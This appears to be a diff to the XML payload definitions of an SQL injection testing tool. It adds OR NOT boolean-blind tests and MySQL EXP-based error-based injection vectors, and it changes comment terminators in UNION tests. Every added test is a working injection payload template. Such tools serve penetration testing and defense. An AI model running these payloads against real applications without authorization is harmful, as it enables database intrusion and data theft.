@@ -187,6 +187,22 @@ Tag: <test>
     </test>
 
     <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (NOT)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR NOT [INFERENCE]</vector>
+        <request>
+            <payload>OR NOT [RANDNUM]=[RANDNUM]</payload>
+        </request>
+        <response>
+            <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+
+    <test>
         <title>AND boolean-based blind - WHERE or HAVING clause (Generic comment)</title>
         <stype>1</stype>
         <level>2</level>
@@ -196,7 +212,7 @@ Tag: <test>
         <vector>AND [INFERENCE]</vector>
         <request>
             <payload>AND [RANDNUM]=[RANDNUM]</payload>
-            <comment>-- </comment>
+            <comment>-- -</comment>
         </request>
         <response>
             <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
@@ -213,10 +229,27 @@ Tag: <test>
         <vector>OR [INFERENCE]</vector>
         <request>
             <payload>OR [RANDNUM]=[RANDNUM]</payload>
-            <comment>-- </comment>
+            <comment>-- -</comment>
         </request>
         <response>
             <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (Generic comment) (NOT)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR NOT [INFERENCE]</vector>
+        <request>
+            <payload>OR NOT [RANDNUM]=[RANDNUM]</payload>
+            <comment>-- -</comment>
+        </request>
+        <response>
+            <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
         </response>
     </test>
 
@@ -254,6 +287,26 @@ Tag: <test>
         </request>
         <response>
             <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR NOT [INFERENCE]</vector>
+        <request>
+            <payload>OR NOT [RANDNUM]=[RANDNUM]</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -1354,7 +1407,7 @@ Tag: <test>
         </details>
     </test>
     <!-- End of boolean-based blind tests - Stacked queries -->
-
+    
     <!-- Error-based tests - WHERE, HAVING, ORDER BY or GROUP BY clause -->
     <test>
         <title>MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</title>
@@ -1500,6 +1553,46 @@ Tag: <test>
         <details>
             <dbms>MySQL</dbms>
             <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
+        <request>
+            <payload>AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 OR error-based - WHERE, HAVING clause (EXP)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
+        <request>
+            <payload>OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
         </details>
     </test>
 
@@ -2037,6 +2130,26 @@ Tag: <test>
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.5 error-based - Parameter replace (EXP)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
+        <request>
+            <payload>EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)</title>
         <stype>2</stype>
         <level>5</level>
@@ -2249,6 +2362,26 @@ Tag: <test>
         <details>
             <dbms>MySQL</dbms>
             <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
+        <request>
+            <payload>,EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
         </details>
     </test>
 
@@ -2524,7 +2657,7 @@ Tag: <test>
         </details>
     </test>
     <!-- End of inline queries tests -->
-
+    
     <!-- Stacked queries tests -->
     <test>
         <title>MySQL &gt; 5.0.11 stacked queries (SELECT - comment)</title>
@@ -3211,8 +3344,8 @@ Tag: <test>
         </details>
     </test>
     <!-- TODO: if possible, add payload for Microsoft Access -->
-    <!-- End of stacked queries tests -->        
-
+    <!-- End of stacked queries tests -->
+    
     <!-- Time-based boolean tests -->
     <test>
         <title>MySQL &gt;= 5.0.12 AND time-based blind (SELECT)</title>
@@ -5193,7 +5326,7 @@ Tag: <test>
         </details>
     </test>
     <!-- TODO: if possible, add payload for Microsoft Access -->
-    <!-- End of time-based boolean tests - ORDER BY, GROUP BY clause -->        
+    <!-- End of time-based boolean tests - ORDER BY, GROUP BY clause -->    
 
     <!-- UNION query tests -->
     <test>
@@ -5206,7 +5339,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>[CHAR]</char>
             <columns>[COLSTART]-[COLSTOP]</columns>
         </request>
@@ -5225,7 +5358,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>NULL</char>
             <columns>[COLSTART]-[COLSTOP]</columns>
         </request>
@@ -5244,7 +5377,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>[RANDNUM]</char>
             <columns>[COLSTART]-[COLSTOP]</columns>
         </request>
@@ -5263,7 +5396,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>[CHAR]</char>
             <columns>1-10</columns>
         </request>
@@ -5282,7 +5415,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>NULL</char>
             <columns>1-10</columns>
         </request>
@@ -5301,7 +5434,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>[RANDNUM]</char>
             <columns>1-10</columns>
         </request>
@@ -5320,7 +5453,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>[CHAR]</char>
             <columns>11-20</columns>
         </request>
@@ -5339,7 +5472,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>NULL</char>
             <columns>11-20</columns>
         </request>
@@ -5358,7 +5491,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>[RANDNUM]</char>
             <columns>11-20</columns>
         </request>
@@ -5377,7 +5510,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>[CHAR]</char>
             <columns>21-30</columns>
         </request>
@@ -5396,7 +5529,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>NULL</char>
             <columns>21-30</columns>
         </request>
@@ -5415,7 +5548,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>[RANDNUM]</char>
             <columns>21-30</columns>
         </request>
@@ -5434,7 +5567,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>[CHAR]</char>
             <columns>31-40</columns>
         </request>
@@ -5453,7 +5586,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>NULL</char>
             <columns>31-40</columns>
         </request>
@@ -5472,7 +5605,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>[RANDNUM]</char>
             <columns>31-40</columns>
         </request>
@@ -5491,7 +5624,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>[CHAR]</char>
             <columns>41-50</columns>
         </request>
@@ -5509,7 +5642,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>NULL</char>
             <columns>41-50</columns>
         </request>
@@ -5528,7 +5661,7 @@ Tag: <test>
         <vector>[UNION]</vector>
         <request>
             <payload/>
-            <comment>-- </comment>
+            <comment>-- -</comment>
             <char>[RANDNUM]</char>
             <columns>41-50</columns>
         </request>
@@ -5932,6 +6065,5 @@ Tag: <test>
             <dbms>MySQL</dbms>
         </details>
     </test>
-    <!-- End of UNION query tests -->
-
+    <!-- End of UNION query tests -->          
 </root>
